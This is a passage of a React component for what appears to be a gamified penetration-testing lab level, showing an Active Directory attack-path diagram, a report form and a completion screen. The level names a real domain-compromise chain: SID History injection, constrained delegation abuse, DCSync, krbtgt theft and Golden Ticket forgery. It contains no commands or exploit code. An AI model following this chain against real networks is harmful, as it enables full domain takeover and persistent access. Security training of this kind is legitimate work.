                            <div className="flex items-center gap-2">
                              <div className="text-2xl">↓</div>
                            </div>
                            
                            <div className="flex items-center gap-2">
                              <div className="w-12 h-12 rounded-full bg-red-500/20 border-2 border-red-500 flex items-center justify-center text-xs">
                                DELEG
                              </div>
                              <span className="text-muted-foreground">→</span>
                              <div className="flex-1">
                                <div className="font-semibold">HQ-APP-01$ has Constrained Delegation</div>
                                <div className="text-xs text-yellow-400">
                                  Allowed to delegate to: CIFS/HQ-DC-01.hq.breachlabs.local
                                </div>
                              </div>
                            </div>
                            
                            <div className="flex items-center gap-2">
                              <div className="text-2xl">↓</div>
                            </div>
                            
                            <div className="flex items-center gap-2">
                              <div className="w-12 h-12 rounded-full bg-yellow-500/20 border-2 border-yellow-500 flex items-center justify-center text-xs">
                                DC
                              </div>
                              <span className="text-muted-foreground">→</span>
                              <div className="flex-1">
                                <div className="font-semibold">HQ-DC-01.hq.breachlabs.local</div>
                                <div className="text-xs text-green-400">
                                  DCSync capability → Extract krbtgt hash → Golden Ticket
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>

                        <Alert className="border-yellow-400/50">
                          <AlertTriangle className="h-4 w-4 text-yellow-400" />
                          <AlertDescription className="text-sm text-yellow-400">
                            <strong>Attack Path Identified:</strong> SID History injection → Cross-forest pivot → 
                            Constrained delegation abuse → DCSync → Golden Ticket
                          </AlertDescription>
                        </Alert>
                      </div>
                    )}
                  </CardContent>
                </Card>
              </TabsContent>

              <TabsContent value="report" className="space-y-4">
                <Card className="glass">
                  <CardHeader>
                    <CardTitle>Enterprise Vulnerability Report</CardTitle>
                    <CardDescription>
                      Document the complete multi-forest attack chain and enterprise mitigations
                    </CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <div>
                      <label className="text-sm font-medium mb-2 block">
                        Final Report (Minimum 800 words)
                      </label>
                      <Textarea
                        value={vulnerabilityReport}
                        onChange={(e) => setVulnerabilityReport(e.target.value)}
                        placeholder="Executive Summary&#10;&#10;1. Trust Relationship Vulnerabilities:&#10;   - SID Filtering status and implications&#10;   - SID History injection technique and detection&#10;&#10;2. Constrained Delegation Exploitation:&#10;   - S4U2Self and S4U2Proxy attack chain&#10;   - Why this bypasses normal authentication&#10;&#10;3. Golden Ticket Attack:&#10;   - krbtgt compromise methodology&#10;   - Ticket forgery process and capabilities&#10;   - Persistence implications&#10;&#10;4. Enterprise-Level Mitigations:&#10;   - Enable SID filtering/quarantining on all external trusts&#10;   - Implement Protected Users security group&#10;   - Deploy tiered administration model&#10;   - Monitor for DCSync activity and unusual Kerberos tickets&#10;   - Regular krbtgt password rotation"
                        className="h-[350px] text-sm font-mono"
                      />
                      <div className="text-xs text-muted-foreground mt-1">
                        {vulnerabilityReport.length} characters
                      </div>
                    </div>

                    <Alert className="border-yellow-400/50">
                      <AlertTriangle className="h-4 w-4 text-yellow-400" />
                      <AlertDescription className="text-sm">
                        Your report must comprehensively cover: (1) SID History attack, (2) Constrained delegation abuse, 
                        (3) Golden Ticket theory and creation process, (4) Enterprise-level defensive controls
                      </AlertDescription>
                    </Alert>

                    <Button 
                      onClick={submitFinalReport}
                      disabled={!goldenTicketForged || !missionComplete}
                      className="w-full bg-gradient-to-r from-yellow-600 to-yellow-800 text-black font-bold"
                      style={{ boxShadow: '0 0 40px rgba(255, 215, 0, 0.3)' }}
                    >
                      Submit Final Report
                    </Button>
                  </CardContent>
                </Card>
              </TabsContent>
            </Tabs>
          </div>
        )}

        {missionPhase === "completed" && (
          <Card className="max-w-4xl mx-auto glass" style={{
            border: '2px solid rgba(255, 215, 0, 0.6)',
            boxShadow: '0 0 60px rgba(255, 215, 0, 0.4)'
          }}>
            <CardHeader className="text-center">
              <Crown className="w-20 h-20 mx-auto mb-4" style={{ color: '#FFD700' }} />
              <CardTitle className="text-4xl" style={{ color: '#FFD700' }}>
                Operation "Golden Handshake" Complete
              </CardTitle>
              <CardDescription className="text-lg">
                TOTAL ENTERPRISE DOMINANCE ACHIEVED
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <Alert style={{
                background: 'rgba(255, 215, 0, 0.1)',
                border: '1px solid rgba(255, 215, 0, 0.5)'
              }}>
                <Crown className="h-5 w-5" style={{ color: '#FFD700' }} />
                <AlertDescription style={{ color: '#FFD700' }} className="font-semibold">
                  You have successfully exploited a complex forest trust relationship, escalated privileges across security 
                  boundaries via constrained delegation abuse, compromised the krbtgt account, forged a Golden Ticket, and 
                  achieved total, persistent control over the enterprise. This represents mastery of the most advanced 
                  Active Directory attack techniques.
                </AlertDescription>
              </Alert>

              <div className="space-y-3">
                <h3 className="text-lg font-semibold" style={{ color: '#FFD700' }}>Attack Chain Summary</h3>
                <div className="grid grid-cols-2 gap-3 text-sm">
                  <div className="flex items-center gap-2">
                    <CheckCircle className="w-4 h-4 text-green-400" />
                    <span>Forest Trust Enumeration</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <CheckCircle className="w-4 h-4 text-green-400" />
                    <span>SID Filtering Validation</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <CheckCircle className="w-4 h-4 text-green-400" />
                    <span>BloodHound Path Analysis</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <CheckCircle className="w-4 h-4 text-green-400" />
                    <span>SID History Injection</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <CheckCircle className="w-4 h-4 text-green-400" />
                    <span>Cross-Forest Pivot</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <CheckCircle className="w-4 h-4 text-green-400" />
                    <span>Constrained Delegation Discovery</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <CheckCircle className="w-4 h-4 text-green-400" />
                    <span>S4U2Proxy Exploitation</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <CheckCircle className="w-4 h-4 text-green-400" />
                    <span>DCSync Attack</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <CheckCircle className="w-4 h-4 text-green-400" />
                    <span>krbtgt Compromise</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <CheckCircle className="w-4 h-4 text-green-400" />
                    <span>Golden Ticket Forgery</span>
                  </div>
                </div>
              </div>

              <div className="border-t border-border pt-6 text-center">
                <div className="text-3xl font-bold mb-2" style={{ color: '#FFD700' }}>
                  🏆 EXPERT TRACK COMPLETE 🏆
                </div>
                <p className="text-muted-foreground mb-6">
                  You have mastered the most advanced offensive security techniques in Active Directory exploitation. 
                  You understand enterprise security architecture, Kerberos internals, trust relationships, and persistence mechanisms.
                </p>
              </div>

              <div className="flex justify-center gap-4 pt-4">
                <Button asChild variant="outline">
                  <Link to="/blacksite-missions">Blacksite Mission Hub</Link>
                </Button>
                <Button asChild variant="outline">
                  <Link to="/challenges">Challenge Library</Link>
                </Button>
                <Button asChild className="bg-gradient-to-r from-yellow-600 to-yellow-800 text-black font-bold">
                  <Link to="/">Return to Grid</Link>
                </Button>
              </div>
            </CardContent>
          </Card>
        )}
      </div>
    </div>
  );
};

export default Level30;
